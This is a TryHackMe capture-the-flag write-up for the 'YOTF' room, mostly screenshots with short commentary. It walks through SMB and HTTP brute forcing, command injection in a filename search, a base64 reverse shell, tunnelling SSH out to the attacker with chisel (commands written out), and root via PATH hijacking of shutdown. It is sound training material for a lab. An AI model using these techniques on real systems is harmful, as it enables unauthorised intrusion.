---
Title: "YOTF — TryHackMe Writeup"
Author: Cankun Wang
date: 2025-12-3
tags: [tryhackme, writeup]
---

----

#Task

![image-20251203103306407](./assets/image-20251203103306407.png)

#Enumeration

![image-20251203103341716](./assets/image-20251203103341716.png)

We directly start with nmap service detection.

We find port 139 and 445 opened. Samba smbd is the service version.

Let's keep enumerate first.

![image-20251203103607406](./assets/image-20251203103607406.png)

The target website is a login page.

I am thinking running a dirsearch first.

![image-20251203103818811](./assets/image-20251203103818811.png)

We find nothing. Let's come back to nmap.

Samba smbd is opened, which means we can try smb enumerate.

We try the -N.

![image-20251203104441002](./assets/image-20251203104441002.png)

However, guest and null have no access to the target smb.

![image-20251203104802416](./assets/image-20251203104802416.png)

We need the credential.

So I decide to enumerate the smb first.

![image-20251203105813026](./assets/image-20251203105813026.png)

It shows that -N can not access any share. yotf exists and it has the Fox's staff. Share needs credentials.

We use enum4linux for next step.

![image-20251203110014264](./assets/image-20251203110014264.png)

![image-20251203110020345](./assets/image-20251203110020345.png)

![image-20251203110037019](./assets/image-20251203110037019.png)

![image-20251203110049268](./assets/image-20251203110049268.png)

We find two possible users here---fox and rascal

![image-20251203145127943](./assets/image-20251203145127943.png)

I use Medusa to brute force. However, we didn't find password for fox, but we did find password for rascal.

![image-20251203145208686](./assets/image-20251203145208686.png)

Let's use this credential.

However, we failed. I am thinking back is there another place we can play brute force?

I realize the target website is a login page, which means is a http basic authenitcation.

![image-20251203151512425](./assets/image-20251203151512425.png)

We should try to brute force this.

![image-20251203151634507](./assets/image-20251203151634507.png)

![image-20251203151739890](./assets/image-20251203151739890.png)

We have the rascal credential. (I also tried the fox, but obviously we can't use brute force to get fox credential)

Let's login the target website as rascal first.

![image-20251203153137201](./assets/image-20251203153137201.png)

It is a search site.

![image-20251203153215945](./assets/image-20251203153215945.png)

I tried to search for something, and it returned no file returned, which means we can use this to view the system file? I hope so.

Let's try.

#Exploit

Okay, now I know there is some rules here. We can only type in characters and numbers. And all characters will be converted to upper case.

Only dot is allowed. This means frontend may have special rules to limit the input. However, frontend has rules doesn't means backend will have the same rules. Let's use burp.

![image-20251203154920271](./assets/image-20251203154920271.png)

We are correct. The backend doesn't have input filter. And at the same time, when I delete the 

qutation marks, I got a superise.

![image-20251203155023425](./assets/image-20251203155023425.png)

That is really superise. I would consider these files as a kind of hint, but maybe they are tricks.

This means the backend probably doesn't decode as json, because this is an invalid json arguments and the backend should return 400. The backend here may be just directly take the whole things as a parameter to include or input.

![image-20251203155809959](./assets/image-20251203155809959.png)

When we try to search for this file, it will directly return the filename.

This means this is just a simple filename search engine, if the target is invalid, it will return all filenames. Otherwise, if the filename exist, it will return the filenames.

Till there, I want to try the command injection.

![image-20251203160640270](./assets/image-20251203160640270.png)

I tried multiple ways to inject command---url encode, semi encode, full encode...They all failed. And all return the three file names or no files returned. I realize the backend may be like this: ls -l("input"), I need to find a way to break this.

![image-20251203163236574](./assets/image-20251203163236574.png)

We are here!

We use \ " to escape from the string and start a new command.

And \n to start the command at the new line.
Let's try to find the web flag first.

![image-20251203185558814](./assets/image-20251203185558814.png)

For the dot dot slash, I tried many times. Let's keep going to reverse shell.



![image-20251203171233441](./assets/image-20251203171233441.png)

We need to base64 encode the reverse shell.

![image-20251203171421784](./assets/image-20251203171421784.png)

Then we will have a reverse shell.

![image-20251203171443916](./assets/image-20251203171443916.png)

#Escalation privilege

![image-20251203172254247](./assets/image-20251203172254247.png)



We first find the directory of the fox.txt.

![image-20251203172326545](./assets/image-20251203172326545.png)

We see these three files, fox.txt and important-data.txt are empty. let's view the content of creds2.txt.

![image-20251203172406854](./assets/image-20251203172406854.png)

Decode this.

![image-20251203173216325](./assets/image-20251203173216325.png)

Okay, so it is not a simply base 64 encode.

![image-20251203173258017](./assets/image-20251203173258017.png)

I first decode it for once and save the output to the /tmp directory(we have access here). And try to use file to determine what it is. However, we failed. "data" means it can't determine the type.

We have tried a lot, and the result show that it may contain something, but not the thing we need now.

Let's find another way.

![image-20251203174748362](./assets/image-20251203174748362.png)

List all processes here.

![image-20251203174815939](./assets/image-20251203174815939.png)

Here, we find ssh is running.

Maybe we can try the ssh?

We still have another username fox, maybe we can try brute force. But before that, I will check for some other path first.

![image-20251203175146268](./assets/image-20251203175146268.png)

No suid availble(pkexec is not availble)

No sudo

No cronjob

It seems brute force ssh is the only choice.

We first need to forward the ssh to our port since it is running locally.

![image-20251203175828138](./assets/image-20251203175828138.png)

Use chisel to do this.

However, the target machine is really old, so we need a old chisel.

---

wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz

gunzip chisel_1.9.1_linux_amd64.gz
mv chisel_1.9.1_linux_amd64 chisel
chmod +x chisel

---

We use wget to get the chisel in www-data. And then run the chisel to forward the port.

---

/tmp/chisel client http://your ip:your port R:2222:127.0.0.1:22

---

![image-20251203181027877](./assets/image-20251203181027877.png)

![image-20251203181039312](./assets/image-20251203181039312.png)

Okay, now we can perform brute force.

![image-20251203181529300](./assets/image-20251203181529300.png)

![image-20251203181539036](./assets/image-20251203181539036.png)

Let's login.

![image-20251203181849381](./assets/image-20251203181849381.png)

Now we are fox.

![image-20251203182136152](./assets/image-20251203182136152.png)

We have the user flag.

Let's keep escalate privilege.

![image-20251203182625454](./assets/image-20251203182625454.png)

Okay, we find the path.

We now will write a script to the target path, and "shutdown" will help us run it.

![image-20251203182701937](./assets/image-20251203182701937.png)

![image-20251203182944210](./assets/image-20251203182944210.png)

But we can't copy to the target directory.

We need to consider path hijacking.

![image-20251203183558555](./assets/image-20251203183558555.png)

These two will definetely be called by shutdown.

![image-20251203183717340](./assets/image-20251203183717340.png)

We create a fake poweroff and put the /tmp/poweroff to the front of the PATH. 

Then we can run the shutdown as root and escalate privlege.

![image-20251203183828381](./assets/image-20251203183828381.png)

![image-20251203184111810](./assets/image-20251203184111810.png)

Well, there is still a superise.

![image-20251203184145934](./assets/image-20251203184145934.png)

![image-20251203184154358](./assets/image-20251203184154358.png)

Thanks for reading!